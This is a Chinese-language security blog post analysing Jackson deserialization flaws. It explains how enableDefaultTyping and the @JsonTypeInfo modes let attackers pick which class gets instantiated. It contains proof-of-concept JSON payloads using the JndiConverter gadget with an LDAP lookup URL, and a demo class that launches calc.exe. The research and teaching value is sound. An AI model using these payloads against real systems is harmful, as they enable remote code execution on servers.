# Jackson漏洞原理与检测、利用方式研究
# Jackson简介
前面分析了两个关于 fastjson 的漏洞，这篇文章再提一嘴 Jackson。
实际上这两个JSON处理类库的多数漏洞是可以通用的，原理也就是通过反射实例化对象，在调用构造函数或调用get/set方法时触发敏感操作。Jackson框架被发现存在一个反序列化代码执行漏洞。该漏洞存在于Jackson框架下的enableDefaultTyping方法，通过该漏洞，攻击者可以远程在服务器主机上越权执行任意代码，从而取得该网站服务器的控制权。
满足下面三个条件是可以导致反序列化漏洞：
* 调用了ObjectMapper.enableDefaultTyping()函数，参数为四个类型；
* 反序列化的类的属性使用了值为JsonTypeInfo.Id.CLASS的@JsonTypeInfo注解；
* 反序列化的类的属性使用了值为JsonTypeInfo.Id.MINIMAL_CLASS的@JsonTypeInfo注解；
## enableDefaultTyping触发反序列化
```java
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();
mapper.readValue(jsonString, A.class);

DefaultTyping的几种模式：

/**
    * This value means that only properties that have
    * {@link java.lang.Object} as declared type (including
    * generic types without explicit type) will use default
    * typing.
*/
JAVA_LANG_OBJECT: 只有Object类型属性，才能反序列化为任何实例。
/**
    * Value that means that default typing will be used for
    * properties with declared type of {@link java.lang.Object}
    * or an abstract type (abstract class or interface).
    * Note that this does <b>not</b> include array types.
    *<p>
    * Since 2.4, this does NOT apply to {@link TreeNode} and its subtypes.
*/
OBJECT_AND_NON_CONCRETE: 包含上述 JAVA_LANG_OBJECT 的特性，并且对于接口类型定义的属性，可以反序列化为任意实现类实例，不指定的时候默认使用该类型。
/**
    * Value that means that default typing will be used for
    * all types covered by {@link #OBJECT_AND_NON_CONCRETE}
    * plus all array types for them.
    *<p>
    * Since 2.4, this does NOT apply to {@link TreeNode} and its subtypes.
*/
 NON_CONCRETE_AND_ARRAYS: 包含上述 JAVA_LANG_OBJECT 和 OBJECT_AND_NON_CONCRETE 的特性，增加了数组支持
/**
    * Value that means that default typing will be used for
    * all non-final types, with exception of small number of
    * "natural" types (String, Boolean, Integer, Double), which
    * can be correctly inferred from JSON; as well as for
    * all arrays of non-final types.
    *<p>
    * Since 2.4, this does NOT apply to {@link TreeNode} and its subtypes.
*/
 NON_FINAL: 包含上述所有特性，除了final定义的属性不能反序列化，其他都可以
```
## JsonTypeInfo触发反序列化
在将多态类型进行JSON序列化后，Jackson无法在反序列化期间找出正确的类型，Jackson里使用@JsonTypeInfo注解处理多态类型的序列化和反序列化。此注解用于序列化有关多态实例的实际类的信息，以便Jackson可以知道要反序列化的子类型。有两种方式添加注解：

（1）@JsonTypeInfo注解加到父类定义上
```java
@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)
public class BaseClass {
}
```
（2）@JsonTypeInfo注解加到包含父类的成员变量上面
```java
//@JsonTypeInfo注解不仅可以加在父类的定义上面，也可以加到包含父类的成员变量上面
public class Test {
  @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)
  private List<BaseClass> bean;
}
```
|  配置   | 说明  |
|  ----  | ----  |
| @JsonTypeInfo(use = JsonTypeInfo.Id.NONE)  | 字如其名，和没设置一样. |
| @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)  | Json多了@class字段，用于标明相关属性的包和类名。使用 @JsonTypeInfo(use = Id.CLASS) 注解的反序列化能利用，但必须和定义类型一致. |
| @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS) | Json多了@c字段，用于标明相关属性的包和类名。使用 @JsonTypeInfo(use = Id.MINIMAL_CLASS) 注解的反序列化能利用，但必须和定义类型一致. |
| @JsonTypeInfo(use = JsonTypeInfo.Id.NAME) | Json多了@type字段，用于标明相关属性的类名(无包) |
| @JsonTypeInfo(use = JsonTypeInfo.Id.CUSTOM) | 用户自定义，需要手写解析器|
||

### **JsonTypeInfo.Id.CLASS利用**
```java
class A2 {
    private int i = 1;
    @JsonTypeInfo(use = Id.CLASS)
    private Object object;
    @JsonTypeInfo(use = Id.CLASS)
    private InterfaceA aa;
}
// 存在Object属性且注解为Id.CLASS
ObjectMapper mapper = new ObjectMapper();
 json = "{\"i\":1,\"object\":{\"@class\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"asText\":\"ldap://localhost:43658/Calc\"}}";
a = mapper.readValue(json, A2.class);
System.out.println(a.getAa().getClass().getName());

// 存在继承父类或接口InterfaceA的属性且注解为Id.CLASS
json = "{\"i\":1,\"aa\":{\"@class\":\"com.jackson.test.JsonTypeInfoTest$AA\",\"xx\":2}}";
a = mapper.readValue(json, A2.class);

class AA implements InterfaceA {
    int xx;
    public AA() throws IOException {
        Runtime.getRuntime().exec("calc.exe");
    }
}
```
### **JsonTypeInfo.Id.MINIMAL_CLASS利用**
```java
class A3 {
    private int i = 1;
    @JsonTypeInfo(use = Id.MINIMAL_CLASS)
    private Object object;
    @JsonTypeInfo(use = Id.MINIMAL_CLASS)
    private InterfaceA aa;
}
// 存在Object属性且注解为Id.CLASS
ObjectMapper mapper = new ObjectMapper();
 json = "{\"i\":1,\"object\":{\"@c\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"asText\":\"ldap://localhost:43658/Calc\"}}";
a = mapper.readValue(json, A3.class);
System.out.println(a.getAa().getClass().getName());

// 存在继承父类或接口InterfaceA的属性且注解为Id.CLASS
json = "{\"i\":1,\"aa\":{\"@c\":\"com.jackson.test.JsonTypeInfoTest$AA\",\"xx\":2}}";
a = mapper.readValue(json, A3.class);

class AA implements InterfaceA {
    int xx;
    public AA() throws IOException {
        Runtime.getRuntime().exec("calc.exe");
    }
}
```
### **`JsonTypeInfo.Id.NAME`**
```java
 class A4 {
    private int i = 1;
    @JsonTypeInfo(use = Id.NAME)
    private Object object;
    @JsonTypeInfo(use = Id.NAME)
    private AA subaa;
    @JsonTypeInfo(use = Id.NAME)
    private InterfaceA aa;
 }
//反序列化失败，并不能反序列化任意类
json = "{\"i\":1,\"object\":{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"asText\":\"ldap://localhost:43658/Calc\"},\"aa\":null}";
a = mapper.readValue(json, A4.class);
//反序列化失败，并不能反序列化继承InterfaceA的子类AA
json = "{\"i\":1,\"aa\":{\"@type\":\"JsonTypeInfoTest$AA\",\"xx\":2}}";
a = mapper.readValue(json, A4.class);
//反序列化成功，AA
json = "{\"i\":1,\"subaa\":{\"@type\":\"JsonTypeInfoTest$AA\",\"xx\":2}}";
a = mapper.readValue(json, A4.class);
```
### **JsonTypeInfo.Id.CUSTOM**
```java
class A5 {
    private int i = 1;
    @JsonTypeInfo(use = Id.CUSTOM)
    private Object object;
    private InterfaceA aa;
}
// 直接反序列化失败，需要自定义转换器
String json = "{\"i\":1,\"object\":{\"@type\":\"JsonTypeInfoTest$B\",\"i\":2},\"aa\":null}";
mapper.readValue(json,A5.class);
```
# 参考
https://blog.csdn.net/qq_34101364/article/details/111996656

http://pirogue.org/2018/01/12/jackson-databind-rce/

https://b1ue.cn/archives/189.html

http://blog.nsfocus.net/jackson-framework-java-vulnerability-analysis/

https://xz.aliyun.com/t/8012

https://xz.aliyun.com/t/9331